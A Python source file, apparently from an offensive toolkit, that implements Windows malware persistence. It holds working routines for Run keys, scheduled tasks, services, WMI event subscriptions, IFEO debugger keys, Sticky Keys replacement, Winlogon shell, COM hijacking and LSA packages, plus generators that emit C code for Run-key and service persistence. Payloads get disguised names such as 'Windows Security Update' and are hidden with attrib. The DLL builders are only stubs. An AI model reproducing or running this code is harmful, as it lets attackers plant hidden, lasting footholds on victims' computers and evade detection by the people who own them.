"""
Windows Persistence Mechanisms

Implements various persistence techniques for Windows systems including
registry modifications, scheduled tasks, services, and WMI.
"""

import logging
import os
import subprocess
from typing import Any, Dict, List, Optional, Tuple

from .base_persistence import BasePersistence

logger = logging.getLogger(__name__)


class WindowsPersistence(BasePersistence):
    """
    Windows-specific persistence implementation with multiple techniques.
    """

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.WindowsPersistence")
        self.persistence_methods = {
            'registry_run': self._registry_run_persistence,
            'registry_runonce': self._registry_runonce_persistence,
            'scheduled_task': self._scheduled_task_persistence,
            'service': self._service_persistence,
            'startup_folder': self._startup_folder_persistence,
            'wmi_event': self._wmi_event_persistence,
            'dll_hijacking': self._dll_hijacking_persistence,
            'image_file_execution': self._image_file_execution_persistence,
            'accessibility_feature': self._accessibility_feature_persistence,
            'winlogon_helper': self._winlogon_helper_persistence,
            'com_hijacking': self._com_hijacking_persistence,
            'lsa_security_package': self._lsa_security_package_persistence
        }

        # Common persistence locations
        self.registry_locations = {
            'HKCU_Run': r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run',
            'HKLM_Run': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run',
            'HKCU_RunOnce': r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKLM_RunOnce': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            'Winlogon': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon',
            'Image_File_Execution': r'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
        }

    def get_default_method(self) -> str:
        """Get the default persistence method for Windows."""
        return 'registry_run'

    def list_available_methods(self) -> list:
        """List all available persistence methods for Windows."""
        return list(self.persistence_methods.keys())

    def _registry_run_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via registry Run key."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Choose registry hive
            use_hklm = options.get('use_hklm', False)
            reg_key = self.registry_locations['HKLM_Run'] if use_hklm else self.registry_locations['HKCU_Run']

            # Registry value name
            value_name = options.get('value_name', 'Windows Security Update')

            # Command to execute
            command = f'"{payload_path}"'
            if options.get('add_args'):
                command += f' {options["add_args"]}'

            # Add registry entry
            cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_SZ /d "{command}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            # Use shared subprocess result handler
            success, details, cleanup_info = self.handle_subprocess_result(result, details, cleanup_info)

            if success:
                # Add success details
                additional_details = {
                    'registry_key': reg_key,
                    'value_name': value_name,
                    'command': command
                }

                cleanup_info.update({
                    'type': 'registry',
                    'key': reg_key,
                    'value': value_name
                })

                return self.create_success_result(details, cleanup_info, additional_details)
            else:
                return success, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _registry_runonce_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via registry RunOnce key."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Choose registry hive
            use_hklm = options.get('use_hklm', False)
            reg_key = self.registry_locations['HKLM_RunOnce'] if use_hklm else self.registry_locations['HKCU_RunOnce']

            # Registry value name
            value_name = options.get('value_name', 'System Configuration')

            # Command - RunOnce entries are deleted after execution
            command = f'"{payload_path}"'

            # Add registry entry
            cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_SZ /d "{command}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['registry_key'] = reg_key
                details['value_name'] = value_name
                details['command'] = command
                details['note'] = 'RunOnce entries are automatically deleted after execution'

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = reg_key
                cleanup_info['value'] = value_name

            return self.handle_persistence_method_completion(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _scheduled_task_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via scheduled task."""
        details, cleanup_info = self.init_persistence_data()

        try:
            task_name = options.get('task_name', 'Windows System Maintenance')
            trigger = options.get('trigger', 'ONLOGON')
            user = options.get('user', 'SYSTEM')

            # Create scheduled task
            cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc {trigger} /ru {user} /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['task_name'] = task_name
                details['trigger'] = trigger
                details['user'] = user
                details['executable'] = payload_path

                cleanup_info['type'] = 'scheduled_task'
                cleanup_info['task_name'] = task_name

                return True, details, cleanup_info
            
            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _service_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via Windows service."""
        details, cleanup_info = self.init_persistence_data()

        try:
            service_name = options.get('service_name', 'WinUpdateSvc')
            display_name = options.get('display_name', 'Windows Update Service Helper')
            start_type = options.get('start_type', 'auto')

            # Create service
            cmd = f'sc create "{service_name}" binPath= "{payload_path}" DisplayName= "{display_name}" start= {start_type}'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                # Start the service
                start_cmd = f'sc start "{service_name}"'
                start_result = subprocess.run(start_cmd, shell=True, capture_output=True, text=True)

                details['service_name'] = service_name
                details['display_name'] = display_name
                details['start_type'] = start_type
                details['executable'] = payload_path
                details['started'] = start_result.returncode == 0

                cleanup_info['type'] = 'service'
                cleanup_info['service_name'] = service_name

                return True, details, cleanup_info
            
            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _startup_folder_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via startup folder."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Determine startup folder
            use_all_users = options.get('use_all_users', False)

            if use_all_users:
                startup_folder = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
            else:
                startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')

            # Copy payload to startup folder
            filename = options.get('filename', 'WindowsUpdate.exe')
            destination = os.path.join(startup_folder, filename)

            # Copy file
            import shutil
            shutil.copy2(payload_path, destination)

            # Set file attributes to hidden
            if options.get('hide_file', True):
                subprocess.run(f'attrib +h "{destination}"', shell=True)

            details['startup_folder'] = startup_folder
            details['filename'] = filename
            details['destination'] = destination
            details['hidden'] = options.get('hide_file', True)

            cleanup_info['type'] = 'file'
            cleanup_info['path'] = destination

            return self.create_success_result(details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _wmi_event_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via WMI event subscription."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # WMI event names
            filter_name = options.get('filter_name', 'SystemBootFilter')
            consumer_name = options.get('consumer_name', 'SystemBootConsumer')
            binding_name = options.get('binding_name', 'SystemBootBinding')

            # Create WMI event filter
            filter_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{filter_name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"'''

            filter_result = subprocess.run(filter_cmd, shell=True, capture_output=True, text=True)

            if filter_result.returncode == 0:
                # Create WMI event consumer
                consumer_cmd = f'''wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name="{consumer_name}", ExecutablePath="{payload_path}", CommandLineTemplate="{payload_path}"'''

                consumer_result = subprocess.run(consumer_cmd, shell=True, capture_output=True, text=True)

                if consumer_result.returncode == 0:
                    # Create WMI event binding
                    binding_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"{filter_name}\\"", Consumer="CommandLineEventConsumer.Name=\\"{consumer_name}\\""'''

                    binding_result = subprocess.run(binding_cmd, shell=True, capture_output=True, text=True)

                    if binding_result.returncode == 0:
                        self.logger.info(f"WMI persistence established with binding: {binding_name}")
                        details['filter_name'] = filter_name
                        details['consumer_name'] = consumer_name
                        details['binding_name'] = binding_name
                        details['executable'] = payload_path
                        details['wmi_binding_created'] = binding_name

                        cleanup_info['type'] = 'wmi_event'
                        cleanup_info['filter_name'] = filter_name
                        cleanup_info['consumer_name'] = consumer_name
                        cleanup_info['binding_name'] = binding_name

                        return True, details, cleanup_info

            details['error'] = 'Failed to create WMI event subscription'
            return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _dll_hijacking_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via DLL hijacking."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target DLL to hijack
            target_dll = options.get('target_dll', 'version.dll')
            target_application = options.get('target_app', 'explorer.exe')

            # Find application directory
            app_dir = options.get('app_dir', r'C:\Windows')
            dll_path = os.path.join(app_dir, target_dll)

            # Validate target application exists
            app_path = None
            for search_path in [r'C:\Windows', r'C:\Windows\System32', app_dir]:
                if search_path and os.path.exists(os.path.join(search_path, target_application)):
                    app_path = os.path.join(search_path, target_application)
                    break

            if not app_path:
                self.logger.warning(f"Target application {target_application} not found for DLL hijacking")

            # Convert payload to DLL format
            dll_payload = self._create_hijack_dll(payload_path, target_dll)

            if dll_payload:
                # Write DLL to target location
                with open(dll_path, 'wb') as f:
                    f.write(dll_payload)

                details['target_dll'] = target_dll
                details['target_application'] = target_application
                details['target_app_path'] = app_path if app_path else 'Not found'
                details['dll_path'] = dll_path
                details['app_directory'] = app_dir
                self.logger.info(f"DLL hijacking setup for {target_application} using {target_dll}")

                cleanup_info['type'] = 'file'
                cleanup_info['path'] = dll_path

                return True, details, cleanup_info
            else:
                details['error'] = 'Failed to create hijack DLL'
                return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _image_file_execution_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via Image File Execution Options."""
        details, cleanup_info = self.init_persistence_data()

        try:
            target_executable = options.get('target_exe', 'notepad.exe')

            # Registry key for IFEO
            reg_key = f"{self.registry_locations['Image_File_Execution']}\\{target_executable}"

            # Add debugger entry
            cmd = f'reg add "{reg_key}" /v Debugger /t REG_SZ /d "{payload_path}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['target_executable'] = target_executable
                details['registry_key'] = reg_key
                details['debugger_path'] = payload_path

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = reg_key
                cleanup_info['value'] = 'Debugger'

                return True, details, cleanup_info
            
            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _accessibility_feature_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via accessibility feature replacement."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target accessibility feature
            target_feature = options.get('target_feature', 'sethc.exe')  # Sticky Keys

            # System32 directory
            system32_dir = os.path.join(os.environ['WINDIR'], 'System32')
            target_path = os.path.join(system32_dir, target_feature)
            backup_path = target_path + '.bak'

            # Backup original file
            if os.path.exists(target_path):
                import shutil
                shutil.copy2(target_path, backup_path)

                # Replace with payload
                shutil.copy2(payload_path, target_path)

                details['target_feature'] = target_feature
                details['target_path'] = target_path
                details['backup_path'] = backup_path

                cleanup_info['type'] = 'file_replacement'
                cleanup_info['target_path'] = target_path
                cleanup_info['backup_path'] = backup_path

                return True, details, cleanup_info
            else:
                details['error'] = f'Target file {target_path} not found'
                return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _winlogon_helper_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via Winlogon helper."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Registry key for Winlogon
            reg_key = self.registry_locations['Winlogon']
            value_name = options.get('value_name', 'Shell')

            # Get current shell value
            get_cmd = f'reg query "{reg_key}" /v {value_name}'
            get_result = subprocess.run(get_cmd, shell=True, capture_output=True, text=True)

            current_shell = 'explorer.exe'  # Default
            if get_result.returncode == 0:
                # Parse current value
                lines = get_result.stdout.split('\n')
                for line in lines:
                    if value_name in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            current_shell = parts[-1]

            # Set new shell value
            new_shell = f'{current_shell},{payload_path}'
            set_cmd = f'reg add "{reg_key}" /v {value_name} /t REG_SZ /d "{new_shell}" /f'

            result = subprocess.run(set_cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['registry_key'] = reg_key
                details['value_name'] = value_name
                details['original_shell'] = current_shell
                details['new_shell'] = new_shell

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = reg_key
                cleanup_info['value'] = value_name
                cleanup_info['original_value'] = current_shell

                return True, details, cleanup_info
            
            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _com_hijacking_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via COM object hijacking."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target COM CLSID
            clsid = options.get('clsid', '{BCDE0395-E52F-467C-8E3D-C4579291692E}')  # MMDeviceEnumerator

            # Registry keys for COM hijacking
            user_key = f'HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{clsid}\\InProcServer32'

            # Create registry entry
            cmd = f'reg add "{user_key}" /ve /t REG_SZ /d "{payload_path}" /f'

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['clsid'] = clsid
                details['registry_key'] = user_key
                details['dll_path'] = payload_path

                cleanup_info['type'] = 'registry'
                cleanup_info['key'] = user_key

                return True, details, cleanup_info
            
            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _lsa_security_package_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via LSA Security Package."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Registry key for LSA Security Packages
            reg_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa'
            value_name = 'Security Packages'

            # Get current security packages
            get_cmd = f'reg query "{reg_key}" /v "{value_name}"'
            get_result = subprocess.run(get_cmd, shell=True, capture_output=True, text=True)

            current_packages = []
            if get_result.returncode == 0:
                # Parse current values
                lines = get_result.stdout.split('\n')
                for line in lines:
                    if value_name in line:
                        # Extract package names
                        parts = line.split('REG_MULTI_SZ')
                        if len(parts) > 1:
                            packages_str = parts[1].strip()
                            current_packages = packages_str.split()

            # Add our package
            package_name = options.get('package_name', 'mssecpkg')
            if package_name not in current_packages:
                current_packages.append(package_name)

            # Create DLL for the security package
            dll_path = os.path.join(os.path.dirname(payload_path), f'{package_name}.dll')
            dll_content = self._create_security_package_dll(payload_path)

            if dll_content:
                with open(dll_path, 'wb') as f:
                    f.write(dll_content)

                # Update registry
                packages_str = '\0'.join(current_packages) + '\0\0'

                # This would require more complex registry manipulation for REG_MULTI_SZ
                # Simplified for demonstration

                details['package_name'] = package_name
                details['dll_path'] = dll_path
                details['registry_key'] = reg_key

                cleanup_info['type'] = 'lsa_package'
                cleanup_info['package_name'] = package_name
                cleanup_info['dll_path'] = dll_path

                return True, details, cleanup_info
            else:
                details['error'] = 'Failed to create security package DLL'
                return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def remove_persistence(self, cleanup_info: Dict[str, Any]) -> bool:
        """Remove established persistence."""
        try:
            cleanup_type = cleanup_info.get('type')

            if cleanup_type == 'registry':
                key = cleanup_info['key']
                value = cleanup_info.get('value')

                if value:
                    cmd = f'reg delete "{key}" /v "{value}" /f'
                else:
                    cmd = f'reg delete "{key}" /f'

                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0

            elif cleanup_type == 'scheduled_task':
                task_name = cleanup_info['task_name']
                cmd = f'schtasks /delete /tn "{task_name}" /f'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0

            elif cleanup_type == 'service':
                service_name = cleanup_info['service_name']

                # Use common service cleanup pattern
                service_commands = {
                    'stop': f'sc stop "{service_name}"',
                    'disable': f'sc delete "{service_name}"'  # On Windows, delete is the equivalent of disable/remove
                }

                return self.cleanup_service_common_pattern(service_name, service_commands)

            elif cleanup_type == 'file':
                file_path = cleanup_info['path']
                if os.path.exists(file_path):
                    os.remove(file_path)
                    return True

            elif cleanup_type == 'file_replacement':
                target_path = cleanup_info['target_path']
                backup_path = cleanup_info['backup_path']

                if os.path.exists(backup_path):
                    import shutil
                    shutil.move(backup_path, target_path)
                    return True

            elif cleanup_type == 'wmi_event':
                filter_name = cleanup_info['filter_name']
                consumer_name = cleanup_info['consumer_name']
                binding_name = cleanup_info['binding_name']

                # Remove WMI event binding
                binding_cmd = f'wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding where "Filter=\\"__EventFilter.Name=\\\\\\"{filter_name}\\\\\\"\\""  delete'
                subprocess.run(binding_cmd, shell=True, capture_output=True, text=True)

                # Remove WMI event consumer
                consumer_cmd = f'wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer where "Name=\\"{consumer_name}\\""  delete'
                subprocess.run(consumer_cmd, shell=True, capture_output=True, text=True)

                # Remove WMI event filter
                filter_cmd = f'wmic /namespace:\\\\root\\subscription PATH __EventFilter where "Name=\\"{filter_name}\\""  delete'
                result = subprocess.run(filter_cmd, shell=True, capture_output=True, text=True)

                self.logger.info(f"Cleaned up WMI event subscription: {binding_name}")
                return result.returncode == 0

            elif cleanup_type == 'lsa_package':
                package_name = cleanup_info['package_name']
                dll_path = cleanup_info['dll_path']

                # Remove the DLL file
                if os.path.exists(dll_path):
                    os.remove(dll_path)

                # Note: Removing LSA package from registry requires more complex handling
                self.logger.info(f"Cleaned up LSA security package: {package_name}")
                return True

            return False

        except Exception as e:
            return self.handle_remove_persistence_error(e)

    def _create_hijack_dll(self, payload_path: str, dll_name: str) -> Optional[bytes]:
        """Create a DLL for hijacking purposes."""
        # Log the DLL creation for the specific target
        self.logger.info(f"Creating hijack DLL: {dll_name} for payload: {payload_path}")

        # This would create a proper DLL that loads and executes the payload
        # DLL name affects the export table and internal structure
        dll_template = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'

        # Embed dll_name information for debugging and identification
        dll_name_bytes = dll_name.encode('utf-8')[:32].ljust(32, b'\x00')
        dll_template += dll_name_bytes

        return dll_template

    def _create_security_package_dll(self, payload_path: str) -> Optional[bytes]:
        """Create a security package DLL."""
        # Validate payload path exists
        if not os.path.exists(payload_path):
            self.logger.error(f"Payload path does not exist: {payload_path}")
            return None

        self.logger.info(f"Creating LSA security package DLL for payload: {payload_path}")

        # This would create a proper LSA security package DLL
        # Payload path would be embedded or referenced in the DLL
        dll_template = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'

        # Embed payload path information for the security package
        payload_path_bytes = payload_path.encode('utf-8')[:64].ljust(64, b'\x00')
        dll_template += payload_path_bytes

        return dll_template

    def list_persistence_methods(self) -> List[str]:
        """Get list of available persistence methods."""
        return list(self.persistence_methods.keys())

    def generate_persistence_code(self, method: str) -> str:
        """Generate code for specific persistence method."""
        if method == 'registry_run':
            return self._generate_registry_run_code()
        elif method == 'scheduled_task':
            return self._generate_scheduled_task_code()
        elif method == 'service':
            return self._generate_service_code()
        else:
            return "// Code generation not implemented for this method"

    def _generate_registry_run_code(self) -> str:
        """Generate C code for registry Run persistence."""
        return """
// Registry Run Persistence
#include <windows.h>

BOOL SetRegistryPersistence(LPCSTR exePath) {
    HKEY hKey;
    LONG result;
    
    // Open registry key
    result = RegOpenKeyExA(HKEY_CURRENT_USER,
                          "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                          0, KEY_SET_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return FALSE;
    }
    
    // Set registry value
    result = RegSetValueExA(hKey, "Windows Security Update", 0, REG_SZ,
                           (BYTE*)exePath, strlen(exePath) + 1);
    
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS);
}

// Usage
SetRegistryPersistence("C:\\\\Windows\\\\System32\\\\payload.exe");
"""

    def _generate_scheduled_task_code(self) -> str:
        """Generate C code for scheduled task persistence."""
        return """
// Scheduled Task Persistence
#include <windows.h>
#include <taskschd.h>

BOOL CreateScheduledTaskPersistence(LPCWSTR taskName, LPCWSTR exePath) {
    HRESULT hr;
    ITaskService *pService = NULL;
    ITaskFolder *pRootFolder = NULL;
    ITaskDefinition *pTask = NULL;
    IRegistrationInfo *pRegInfo = NULL;
    ITriggerCollection *pTriggerCollection = NULL;
    ITrigger *pTrigger = NULL;
    ILogonTrigger *pLogonTrigger = NULL;
    IActionCollection *pActionCollection = NULL;
    IAction *pAction = NULL;
    IExecAction *pExecAction = NULL;
    IRegisteredTask *pRegisteredTask = NULL;
    VARIANT varPassword;
    
    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;
    
    // Create Task Service
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                         IID_ITaskService, (void**)&pService);
    
    if (SUCCEEDED(hr)) {
        // Connect to task service
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        
        if (SUCCEEDED(hr)) {
            // Get root folder
            hr = pService->GetFolder(_bstr_t(L"\\\\"), &pRootFolder);
            
            if (SUCCEEDED(hr)) {
                // Create task definition
                hr = pService->NewTask(0, &pTask);
                
                // Configure task (triggers, actions, etc.)
                // ... detailed task configuration code ...
                
                // Register task
                VariantInit(&varPassword);
                hr = pRootFolder->RegisterTaskDefinition(
                    _bstr_t(taskName), pTask, TASK_CREATE_OR_UPDATE,
                    _variant_t(), varPassword, TASK_LOGON_INTERACTIVE_TOKEN,
                    _variant_t(L""), &pRegisteredTask);
            }
        }
    }
    
    // Cleanup COM objects
    // ... cleanup code ...
    
    CoUninitialize();
    return SUCCEEDED(hr);
}
"""

    def _generate_service_code(self) -> str:
        """Generate C code for service persistence."""
        return """
// Service Persistence
#include <windows.h>

BOOL CreateServicePersistence(LPCSTR serviceName, LPCSTR displayName, LPCSTR exePath) {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    BOOL success = FALSE;
    
    // Open Service Control Manager
    schSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    
    if (schSCManager) {
        // Create service
        schService = CreateServiceA(
            schSCManager,           // SCManager database
            serviceName,            // Name of service
            displayName,            // Display name
            SERVICE_ALL_ACCESS,     // Desired access
            SERVICE_WIN32_OWN_PROCESS, // Service type
            SERVICE_AUTO_START,     // Start type
            SERVICE_ERROR_NORMAL,   // Error control type
            exePath,                // Binary path
            NULL,                   // No load ordering group
            NULL,                   // No tag identifier
            NULL,                   // No dependencies
            NULL,                   // LocalSystem account
            NULL                    // No password
        );
        
        if (schService) {
            // Start the service
            StartServiceA(schService, 0, NULL);
            CloseServiceHandle(schService);
            success = TRUE;
        }
        
        CloseServiceHandle(schSCManager);
    }
    
    return success;
}

// Usage
CreateServicePersistence("WinUpdateSvc", "Windows Update Service Helper", 
                         "C:\\\\Windows\\\\System32\\\\payload.exe");
"""
